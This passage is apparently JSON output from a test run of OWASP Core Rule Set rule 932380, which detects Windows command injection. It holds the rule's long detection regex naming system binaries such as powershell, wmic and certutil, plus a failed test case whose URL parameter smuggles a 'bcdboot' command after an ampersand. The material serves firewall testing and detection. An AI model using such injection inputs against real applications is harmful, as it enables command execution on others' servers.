"\\^]*o[\\\"\\^]*c[\\\"\\^]*a[\\\"\\^]*l|v[\\\"\\^]*e[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*c[\\\"\\^]*r[\\\"\\^]*e[\\\"\\^]*a[\\\"\\^]*t[\\\"\\^]*e)|E[\\\"\\^]*v[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*d|f[\\\"\\^]*(?:c|i[\\\"\\^]*(?:l[\\\"\\^]*e[\\\"\\^]*s[\\\"\\^]*y[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*e[\\\"\\^]*m[\\\"\\^]*s|n[\\\"\\^]*d[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*r)|l[\\\"\\^]*a[\\\"\\^]*t[\\\"\\^]*t[\\\"\\^]*e[\\\"\\^]*m[\\\"\\^]*p|o[\\\"\\^]*r[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*e[\\\"\\^]*s|r[\\\"\\^]*e[\\\"\\^]*e[\\\"\\^]*d[\\\"\\^]*i[\\\"\\^]*s[\\\"\\^]*k|s[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l|(?:t[\\\"\\^]*y[\\\"\\^]*p|v[\\\"\\^]*e[\\\"\\^]*u[\\\"\\^]*p[\\\"\\^]*d[\\\"\\^]*a[\\\"\\^]*t)[\\\"\\^]*e)|g[\\\"\\^]*(?:e[\\\"\\^]*t[\\\"\\^]*(?:m[\\\"\\^]*a[\\\"\\^]*c|t[\\\"\\^]*y[\\\"\\^]*p[\\\"\\^]*e)|o[\\\"\\^]*t[\\\"\\^]*o|p[\\\"\\^]*(?:f[\\\"\\^]*i[\\\"\\^]*x[\\\"\\^]*u[\\\"\\^]*p|(?:r[\\\"\\^]*e[\\\"\\^]*s[\\\"\\^]*u[\\\"\\^]*l[\\\"\\^]*)?t|u[\\\"\\^]*p[\\\"\\^]*d[\\\"\\^]*a[\\\"\\^]*t[\\\"\\^]*e)|r[\\\"\\^]*a[\\\"\\^]*f[\\\"\\^]*t[\\\"\\^]*a[\\\"\\^]*b[\\\"\\^]*l)|h[\\\"\\^]*(?:e[\\\"\\^]*l[\\\"\\^]*p[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*r|o[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*n[\\\"\\^]*a[\\\"\\^]*m[\\\"\\^]*e)|i[\\\"\\^]*(?:c[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*l[\\\"\\^]*s|p[\\\"\\^]*(?:c[\\\"\\^]*o[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*g|x[\\\"\\^]*r[\\\"\\^]*o[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*e)|r[\\\"\\^]*f[\\\"\\^]*t[\\\"\\^]*p)|j[\\\"\\^]*e[\\\"\\^]*t[\\\"\\^]*p[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*k|k[\\\"\\^]*(?:l[\\\"\\^]*i[\\\"\\^]*s[\\\"\\^]*t|s[\\\"\\^]*e[\\\"\\^]*t[\\\"\\^]*u[\\\"\\^]*p|t[\\\"\\^]*(?:m[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l|p[\\\"\\^]*a[\\\"\\^]*s[\\\"\\^]*s))|l[\\\"\\^]*(?:o[\\\"\\^]*(?:d[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*r|g[\\\"\\^]*(?:m[\\\"\\^]*a[\\\"\\^]*n|o[\\\"\\^]*f[\\\"\\^]*f))|p[\\\"\\^]*[qr])|m[\\\"\\^]*(?:a[\\\"\\^]*(?:c[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*e|k[\\\"\\^]*e[\\\"\\^]*c[\\\"\\^]*a[\\\"\\^]*b|p[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n)|k[\\\"\\^]*(?:d[\\\"\\^]*i[\\\"\\^]*r|l[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*k)|m[\\\"\\^]*c|o[\\\"\\^]*u[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*v[\\\"\\^]*o[\\\"\\^]*l|q[\\\"\\^]*(?:b[\\\"\\^]*k[\\\"\\^]*u[\\\"\\^]*p|(?:t[\\\"\\^]*g[\\\"\\^]*)?s[\\\"\\^]*v[\\\"\\^]*c)|s[\\\"\\^]*(?:d[\\\"\\^]*t|i[\\\"\\^]*(?:e[\\\"\\^]*x[\\\"\\^]*e[\\\"\\^]*c|n[\\\"\\^]*f[\\\"\\^]*o[\\\"\\^]*3[\\\"\\^]*2)|t[\\\"\\^]*s[\\\"\\^]*c))|n[\\\"\\^]*(?:b[\\\"\\^]*t[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*a[\\\"\\^]*t|e[\\\"\\^]*t[\\\"\\^]*(?:c[\\\"\\^]*f[\\\"\\^]*g|d[\\\"\\^]*o[\\\"\\^]*m|s[\\\"\\^]*(?:h|t[\\\"\\^]*a[\\\"\\^]*t))|f[\\\"\\^]*s[\\\"\\^]*(?:a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n|s[\\\"\\^]*(?:h[\\\"\\^]*a[\\\"\\^]*r[\\\"\\^]*e|t[\\\"\\^]*a[\\\"\\^]*t))|l[\\\"\\^]*(?:b[\\\"\\^]*m[\\\"\\^]*g[\\\"\\^]*r|t[\\\"\\^]*e[\\\"\\^]*s[\\\"\\^]*t)|s[\\\"\\^]*l[\\\"\\^]*o[\\\"\\^]*o[\\\"\\^]*k[\\\"\\^]*u[\\\"\\^]*p|t[\\\"\\^]*(?:b[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*k[\\\"\\^]*u[\\\"\\^]*p|c[\\\"\\^]*m[\\\"\\^]*d[\\\"\\^]*p[\\\"\\^]*r[\\\"\\^]*o[\\\"\\^]*m[\\\"\\^]*p[\\\"\\^]*t|f[\\\"\\^]*r[\\\"\\^]*s[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*l))|o[\\\"\\^]*(?:f[\\\"\\^]*f[\\\"\\^]*l[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*e|p[\\\"\\^]*e[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*e[\\\"\\^]*s)|p[\\\"\\^]*(?:a[\\\"\\^]*(?:g[\\\"\\^]*e[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*e[\\\"\\^]*c[\\\"\\^]*o[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*i|t[\\\"\\^]*h[\\\"\\^]*p[\\\"\\^]*i[\\\"\\^]*n)[\\\"\\^]*g|(?:b[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i|k[\\\"\\^]*t[\\\"\\^]*m[\\\"\\^]*o)[\\\"\\^]*n|e[\\\"\\^]*(?:n[\\\"\\^]*t[\\\"\\^]*n[\\\"\\^]*t|r[\\\"\\^]*f[\\\"\\^]*m[\\\"\\^]*o[\\\"\\^]*n)|n[\\\"\\^]*p[\\\"\\^]*u[\\\"\\^]*(?:n[\\\"\\^]*a[\\\"\\^]*t[\\\"\\^]*t[\\\"\\^]*e[\\\"\\^]*n[\\\"\\^]*d|t[\\\"\\^]*i[\\\"\\^]*l)|o[\\\"\\^]*(?:p[\\\"\\^]*d|w[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*s[\\\"\\^]*h[\\\"\\^]*e[\\\"\\^]*l[\\\"\\^]*l)|r[\\\"\\^]*n[\\\"\\^]*(?:c[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*g|(?:d[\\\"\\^]*r[\\\"\\^]*v|m[\\\"\\^]*n[\\\"\\^]*g)[\\\"\\^]*r|j[\\\"\\^]*o[\\\"\\^]*b[\\\"\\^]*s|p[\\\"\\^]*o[\\\"\\^]*r[\\\"\\^]*t|q[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*l)|u[\\\"\\^]*(?:b[\\\"\\^]*p[\\\"\\^]*r[\\\"\\^]*n|s[\\\"\\^]*h[\\\"\\^]*(?:d|p[\\\"\\^]*r[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*c[\\\"\\^]*o[\\\"\\^]*n[\\\"\\^]*n[\\\"\\^]*e[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*o[\\\"\\^]*n[\\\"\\^]*s))|w[\\\"\\^]*(?:l[\\\"\\^]*a[\\\"\\^]*u[\\\"\\^]*n[\\\"\\^]*c[\\\"\\^]*h[\\\"\\^]*e[\\\"\\^]*r|s[\\\"\\^]*h))|q[\\\"\\^]*(?:a[\\\"\\^]*p[\\\"\\^]*p[\\\"\\^]*s[\\\"\\^]*r[\\\"\\^]*v|p[\\\"\\^]*r[\\\"\\^]*o[\\\"\\^]*c[\\\"\\^]*e[\\\"\\^]*s[\\\"\\^]*s|u[\\\"\\^]*s[\\\"\\^]*e[\\\"\\^]*r|w[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*a)|r[\\\"\\^]*(?:d(?:[\\\"\\^]*p[\\\"\\^]*s[\\\"\\^]*i[\\\"\\^]*g[\\\"\\^]*n)?|e[\\\"\\^]*(?:f[\\\"\\^]*s[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l|g(?:[\\\"\\^]*(?:i[\\\"\\^]*n[\\\"\\^]*i|s[\\\"\\^]*v[\\\"\\^]*r[\\\"\\^]*3[\\\"\\^]*2))?|l[\\\"\\^]*o[\\\"\\^]*g|(?:(?:p[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i|s[\\\"\\^]*c[\\\"\\^]*a)[\\\"\\^]*)?n|x[\\\"\\^]*e[\\\"\\^]*c)|i[\\\"\\^]*s[\\\"\\^]*e[\\\"\\^]*t[\\\"\\^]*u[\\\"\\^]*p|m[\\\"\\^]*d[\\\"\\^]*i[\\\"\\^]*r|o[\\\"\\^]*b[\\\"\\^]*o[\\\"\\^]*c[\\\"\\^]*o[\\\"\\^]*p[\\\"\\^]*y|p[\\\"\\^]*c[\\\"\\^]*(?:i[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*o|p[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*g)|s[\\\"\\^]*h|u[\\\"\\^]*n[\\\"\\^]*d[\\\"\\^]*l[\\\"\\^]*l[\\\"\\^]*3[\\\"\\^]*2|w[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*a)|s[\\\"\\^]*(?:a[\\\"\\^]*n|c[\\\"\\^]*(?:h[\\\"\\^]*t[\\\"\\^]*a[\\\"\\^]*s[\\\"\\^]*k[\\\"\\^]*s|w[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*d)|e[\\\"\\^]*(?:c[\\\"\\^]*e[\\\"\\^]*d[\\\"\\^]*i[\\\"\\^]*t|r[\\\"\\^]*v[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*(?:(?:c[\\\"\\^]*e[\\\"\\^]*i[\\\"\\^]*p|w[\\\"\\^]*e[\\\"\\^]*r)[\\\"\\^]*o[\\\"\\^]*p[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*n|m[\\\"\\^]*a[\\\"\\^]*n[\\\"\\^]*a[\\\"\\^]*g[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*d)|t[\\\"\\^]*x)|f[\\\"\\^]*c|(?:h[\\\"\\^]*o[\\\"\\^]*w[\\\"\\^]*m[\\\"\\^]*o[\\\"\\^]*u[\\\"\\^]*n|u[\\\"\\^]*b[\\\"\\^]*s)[\\\"\\^]*t|x[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*r[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*e|y[\\\"\\^]*s[\\\"\\^]*(?:o[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*g[\\\"\\^]*r|t[\\\"\\^]*e[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*o))|t[\\\"\\^]*(?:a[\\\"\\^]*(?:k[\\\"\\^]*e[\\\"\\^]*o[\\\"\\^]*w[\\\"\\^]*n|p[\\\"\\^]*i[\\\"\\^]*c[\\\"\\^]*f[\\\"\\^]*g|s[\\\"\\^]*k[\\\"\\^]*(?:k[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*l|l[\\\"\\^]*i[\\\"\\^]*s[\\\"\\^]*t))|(?:c[\\\"\\^]*m[\\\"\\^]*s[\\\"\\^]*e[\\\"\\^]*t[\\\"\\^]*u|f[\\\"\\^]*t)[\\\"\\^]*p|(?:(?:e[\\\"\\^]*l[\\\"\\^]*n[\\\"\\^]*e|i[\\\"\\^]*m[\\\"\\^]*e[\\\"\\^]*o[\\\"\\^]*u)[\\\"\\^]*|r[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*(?:p[\\\"\\^]*)?)t|l[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*n|p[\\\"\\^]*m[\\\"\\^]*(?:t[\\\"\\^]*o[\\\"\\^]*o[\\\"\\^]*l|v[\\\"\\^]*s[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*g[\\\"\\^]*r)|s[\\\"\\^]*(?:(?:d[\\\"\\^]*i[\\\"\\^]*s[\\\"\\^]*)?c[\\\"\\^]*o[\\\"\\^]*n|e[\\\"\\^]*c[\\\"\\^]*i[\\\"\\^]*m[\\\"\\^]*p|k[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*l|p[\\\"\\^]*r[\\\"\\^]*o[\\\"\\^]*f)|y[\\\"\\^]*p[\\\"\\^]*e[\\\"\\^]*p[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*f|z[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l)|u[\\\"\\^]*n[\\\"\\^]*(?:e[\\\"\\^]*x[\\\"\\^]*p[\\\"\\^]*o[\\\"\\^]*s[\\\"\\^]*e|i[\\\"\\^]*q[\\\"\\^]*u[\\\"\\^]*e[\\\"\\^]*i[\\\"\\^]*d|l[\\\"\\^]*o[\\\"\\^]*d[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*r)|v[\\\"\\^]*s[\\\"\\^]*s[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n|w[\\\"\\^]*(?:a[\\\"\\^]*i[\\\"\\^]*t[\\\"\\^]*f[\\\"\\^]*o[\\\"\\^]*r|b[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n|(?:d[\\\"\\^]*s|e[\\\"\\^]*(?:c|v[\\\"\\^]*t))[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l|h[\\\"\\^]*o[\\\"\\^]*a[\\\"\\^]*m[\\\"\\^]*i|i[\\\"\\^]*n[\\\"\\^]*(?:n[\\\"\\^]*t(?:[\\\"\\^]*3[\\\"\\^]*2)?|r[\\\"\\^]*s)|m[\\\"\\^]*i[\\\"\\^]*c|s[\\\"\\^]*c[\\\"\\^]*r[\\\"\\^]*i[\\\"\\^]*p[\\\"\\^]*t)|x[\\\"\\^]*c[\\\"\\^]*o[\\\"\\^]*p[\\\"\\^]*y)(?:\\.[\\\"\\^]*[0-9A-Z_a-z]+)?\\b"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932380
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows Command Injection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932380",
    "test_id" : 2,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932380.yaml",
    "description" : "Windows shell command injection with 'bcdboot': view=image.jpg%26bcdboot /r file.txt\nMatch bcdboot with normal argument\n",
    "cause" : "failed expect_id check: 932380 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "Windows shell command injection with 'bcdboot': view=image.jpg%26bcdboot /r file.txt\nMatch bcdboot with normal argument\n",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "Proxy-Connection" : "keep-alive",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?view%3Dimage.jpg%26bcdboot%20%2Fr%20file.txt",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932380 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932380,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows shell command injections."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " New in CRSv4: The rules 932110 and 932115 were reorganized and renumbered to 932370 and 932380."
        }, {
          "type" : "Comment",
          "text" : " The new rules target specific Windows binaries to simplify future updates of the command list."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See rule 932370 above for further explanation."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is case-insensitive."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932380.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932380"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:[\\n\\r;`\\{]|\\|\\|?|&&?)[\\s\\x0b]*[\\s\\x0b\\\"'\\(,@]*(?:[\\\"'\\.-9A-Z_a-z]+/|(?:[\\\"'\\x5c\\^]*[0-9A-Z_a-z][\\\"'\\x5c\\^]*:[^\\x5c]*|[ \\\"'\\.-9A-Z\\x5c\\^_a-z]*)\\x5c)?[\\\"\\^]*(?:a[\\\"\\^]*(?:s[\\\"\\^]*s[\\\"\\^]*o[\\\"\\^]*c|t[\\\"\\^]*(?:m[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m|t[\\\"\\^]*r[\\\"\\^]*i[\\\"\\^]*b)|u[\\\"\\^]*(?:d[\\\"\\^]*i[\\\"\\^]*t[\\\"\\^]*p[\\\"\\^]*o[\\\"\\^]*l|t[\\\"\\^]*o[\\\"\\^]*(?:c[\\\"\\^]*(?:h[\\\"\\^]*k|o[\\\"\\^]*n[\\\"\\^]*v)|(?:f[\\\"\\^]*m|m[\\\"\\^]*o[\\\"\\^]*u[\\\"\\^]*n)[\\\"\\^]*t)))|b[\\\"\\^]*(?:c[\\\"\\^]*d[\\\"\\^]*(?:b[\\\"\\^]*o[\\\"\\^]*o|e[\\\"\\^]*d[\\\"\\^]*i)[\\\"\\^]*t|(?:d[\\\"\\^]*e[\\\"\\^]*h[\\\"\\^]*d|o[\\\"\\^]*o[\\\"\\^]*t)[\\\"\\^]*c[\\\"\\^]*f[\\\"\\^]*g|i[\\\"\\^]*t[\\\"\\^]*s[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n)|c[\\\"\\^]*(?:a[\\\"\\^]*c[\\\"\\^]*l[\\\"\\^]*s|e[\\\"\\^]*r[\\\"\\^]*t[\\\"\\^]*(?:r[\\\"\\^]*e[\\\"\\^]*q|u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l)|h[\\\"\\^]*(?:c[\\\"\\^]*p|d[\\\"\\^]*i[\\\"\\^]*r|g[\\\"\\^]*(?:l[\\\"\\^]*o[\\\"\\^]*g[\\\"\\^]*o[\\\"\\^]*n|p[\\\"\\^]*o[\\\"\\^]*r[\\\"\\^]*t|u[\\\"\\^]*s[\\\"\\^]*r)|k[\\\"\\^]*(?:d[\\\"\\^]*s[\\\"\\^]*k|n[\\\"\\^]*t[\\\"\\^]*f[\\\"\\^]*s))|l[\\\"\\^]*e[\\\"\\^]*a[\\\"\\^]*n[\\\"\\^]*m[\\\"\\^]*g[\\\"\\^]*r|m[\\\"\\^]*(?:d(?:[\\\"\\^]*k[\\\"\\^]*e[\\\"\\^]*y)?|s[\\\"\\^]*t[\\\"\\^]*p)|s[\\\"\\^]*c[\\\"\\^]*r[\\\"\\^]*i[\\\"\\^]*p[\\\"\\^]*t)|d[\\\"\\^]*(?:c[\\\"\\^]*(?:d[\\\"\\^]*i[\\\"\\^]*a[\\\"\\^]*g|g[\\\"\\^]*p[\\\"\\^]*o[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*x)|e[\\\"\\^]*(?:f[\\\"\\^]*r[\\\"\\^]*a[\\\"\\^]*g|l)|f[\\\"\\^]*s[\\\"\\^]*(?:d[\\\"\\^]*i[\\\"\\^]*a|r[\\\"\\^]*m[\\\"\\^]*i)[\\\"\\^]*g|i[\\\"\\^]*(?:a[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*z|r|s[\\\"\\^]*(?:k[\\\"\\^]*(?:c[\\\"\\^]*o[\\\"\\^]*(?:m[\\\"\\^]*p|p[\\\"\\^]*y)|p[\\\"\\^]*(?:a[\\\"\\^]*r[\\\"\\^]*t|e[\\\"\\^]*r[\\\"\\^]*f)|r[\\\"\\^]*a[\\\"\\^]*i[\\\"\\^]*d|s[\\\"\\^]*h[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*o[\\\"\\^]*w)|p[\\\"\\^]*d[\\\"\\^]*i[\\\"\\^]*a[\\\"\\^]*g))|n[\\\"\\^]*s[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*d|(?:o[\\\"\\^]*s[\\\"\\^]*k[\\\"\\^]*e|r[\\\"\\^]*i[\\\"\\^]*v[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*q[\\\"\\^]*u[\\\"\\^]*e[\\\"\\^]*r)[\\\"\\^]*y)|e[\\\"\\^]*(?:n[\\\"\\^]*d[\\\"\\^]*l[\\\"\\^]*o[\\\"\\^]*c[\\\"\\^]*a[\\\"\\^]*l|v[\\\"\\^]*e[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*c[\\\"\\^]*r[\\\"\\^]*e[\\\"\\^]*a[\\\"\\^]*t[\\\"\\^]*e)|E[\\\"\\^]*v[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*d|f[\\\"\\^]*(?:c|i[\\\"\\^]*(?:l[\\\"\\^]*e[\\\"\\^]*s[\\\"\\^]*y[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*e[\\\"\\^]*m[\\\"\\^]*s|n[\\\"\\^]*d[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*r)|l[\\\"\\^]*a[\\\"\\^]*t[\\\"\\^]*t[\\\"\\^]*e[\\\"\\^]*m[\\\"\\^]*p|o[\\\"\\^]*r[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*e[\\\"\\^]*s|r[\\\"\\^]*e[\\\"\\^]*e[\\\"\\^]*d[\\\"\\^]*i[\\\"\\^]*s[\\\"\\^]*k|s[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l|(?:t[\\\"\\^]*y[\\\"\\^]*p|v[\\\"\\^]*e[\\\"\\^]*u[\\\"\\^]*p[\\\"\\^]*d[\\\"\\^]*a[\\\"\\^]*t)[\\\"\\^]*e)|g[\\\"\\^]*(?:e[\\\"\\^]*t[\\\"\\^]*(?:m[\\\"\\^]*a[\\\"\\^]*c|t[\\\"\\^]*y[\\\"\\^]*p[\\\"\\^]*e)|o[\\\"\\^]*t[\\\"\\^]*o|p[\\\"\\^]*(?:f[\\\"\\^]*i[\\\"\\^]*x[\\\"\\^]*u[\\\"\\^]*p|(?:r[\\\"\\^]*e[\\\"\\^]*s[\\\"\\^]*u[\\\"\\^]*l[\\\"\\^]*)?t|u[\\\"\\^]*p[\\\"\\^]*d[\\\"\\^]*a[\\\"\\^]*t[\\\"\\^]*e)|r[\\\"\\^]*a[\\\"\\^]*f[\\\"\\^]*t[\\\"\\^]*a[\\\"\\^]*b[\\\"\\^]*l)|h[\\\"\\^]*(?:e[\\\"\\^]*l[\\\"\\^]*p[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*r|o[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*n[\\\"\\^]*a[\\\"\\^]*m[\\\"\\^]*e)|i[\\\"\\^]*(?:c[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*l[\\\"\\^]*s|p[\\\"\\^]*(?:c[\\\"\\^]*o[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*g|x[\\\"\\^]*r[\\\"\\^]*o[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*e)|r[\\\"\\^]*f[\\\"\\^]*t[\\\"\\^]*p)|j[\\\"\\^]*e[\\\"\\^]*t[\\\"\\^]*p[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*k|k[\\\"\\^]*(?:l[\\\"\\^]*i[\\\"\\^]*s[\\\"\\^]*t|s[\\\"\\^]*e[\\\"\\^]*t[\\\"\\^]*u[\\\"\\^]*p|t[\\\"\\^]*(?:m[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l|p[\\\"\\^]*a[\\\"\\^]*s[\\\"\\^]*s))|l[\\\"\\^]*(?:o[\\\"\\^]*(?:d[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*r|g[\\\"\\^]*(?:m[\\\"\\^]*a[\\\"\\^]*n|o[\\\"\\^]*f[\\\"\\^]*f))|p[\\\"\\^]*[qr])|m[\\\"\\^]*(?:a[\\\"\\^]*(?:c[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*e|k[\\\"\\^]*e[\\\"\\^]*c[\\\"\\^]*a[\\\"\\^]*b|p[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n)|k[\\\"\\^]*(?:d[\\\"\\^]*i[\\\"\\^]*r|l[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*k)|m[\\\"\\^]*c|o[\\\"\\^]*u[\\\"\\^]*n[\\